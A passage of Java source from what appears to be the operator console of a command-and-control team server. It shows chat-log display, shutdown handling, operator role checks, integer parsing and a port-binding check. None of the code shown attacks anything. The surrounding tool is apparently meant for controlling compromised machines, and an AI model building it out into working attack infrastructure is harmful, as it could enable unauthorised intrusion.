        for (OperatorRole R : OperatorRole.values()) Logger.Custom("    %s%-14s%s %s%n", AnsiColor.White, R.name(), AnsiColor.Reset, R.PermissionString());
        System.out.println();
    }

    private void ShowChat() {
        List<Map<String, Object>> Msgs = Db.GetChatLogs(100);
        System.out.println(TerminalHelper.Box("CHAT MESSAGES"));
        System.out.println();
        if (Msgs.isEmpty()) {
            Logger.Info("  no messages");
            System.out.println();
            return;
        }
        for (Map<String, Object> M : Msgs) {
            String From = M.getOrDefault("from_operator", "?").toString();
            String To = M.getOrDefault("to_operators", "all").toString();
            String Ts = M.getOrDefault("timestamp", "").toString();
            if (Ts.length() > 19) Ts = Ts.substring(11, 19);
            boolean Mine = From.equals(OperatorName);
            Logger.Custom("  %s[%s] %s%s%s [%s]: %s%s%n", Mine ? AnsiColor.Green : AnsiColor.White, Ts, Mine ? AnsiColor.Green : AnsiColor.Red, From, AnsiColor.Reset, To.equals("all") ? "all" : "→ " + To, M.getOrDefault("message", ""), AnsiColor.Reset);
        }
        System.out.println();
    }

    private void ShowChatHistory(int Limit) {
        List<Map<String, Object>> Msgs = Db.GetChatLogs(Limit);
        System.out.println(TerminalHelper.Box("CHAT HISTORY (DB — last " + Limit + ")"));
        System.out.println();
        if (Msgs.isEmpty()) {
            Logger.Info("  no chat history");
            System.out.println();
            return;
        }
        for (Map<String, Object> M : Msgs) {
            String From = M.getOrDefault("from_operator", "?").toString();
            String To = M.getOrDefault("to_operators", "all").toString();
            String Ts = M.getOrDefault("timestamp", "").toString();
            if (Ts.length() > 19) Ts = Ts.substring(11, 19);
            boolean Mine = From.equals(OperatorName);
            Logger.Custom("  %s[%s] %s%s%s [%s]: %s%s%n", Mine ? AnsiColor.Green : AnsiColor.White, Ts, Mine ? AnsiColor.Green : AnsiColor.Red, From, AnsiColor.Reset, To.equals("all") ? "all" : "→ " + To, M.getOrDefault("message", ""), AnsiColor.Reset);
        }
        System.out.println();
    }

    private void Shutdown() {
        if (IsTeamMode && SharedServer != null && SharedServer == Server) {
            Logger.Info("teamserver session ended — listener remains active");
        } else if (Server != null && Server.IsRunning()) {
            Server.StopServer();
        }
        Db.Close();
        Logger.Shutdown();
        System.exit(0);
    }

    private boolean CanExecute() {
        return !IsTeamMode || (OperatorRole != null && OperatorRole.CanExecute());
    }

    private boolean CanManage() {
        return !IsTeamMode || (OperatorRole != null && OperatorRole.CanManage());
    }

    private String Usage(String Cmd) {
        CommandDef D = CommandRegistry.Get(Cmd);
        return D != null ? "usage: " + D.Usage() : "usage: " + Cmd;
    }

    private static int ParseInt(String S) {
        return Integer.parseInt(S.trim());
    }

    private static int ParseIntSafe(String S, int D) {
        try {
            return Integer.parseInt(S.trim());
        } catch (Exception Ex) {
            return D;
        }
    }

    private static List<Integer> ParseIds(String S) {
        List<Integer> Ids = new ArrayList<>();
        for (String Part : S.split(","))
            try {
                Ids.add(Integer.parseInt(Part.trim()));
            } catch (Exception Ignored) {}
        return Ids;
    }

    private static boolean IsPortBound(String Host, int Port) {
        try (ServerSocket T = new ServerSocket()) {
            T.setReuseAddress(false);
            T.bind(new InetSocketAddress(Port));
            return false;
        } catch (IOException Ex) {
            return true;
        }
    }
}
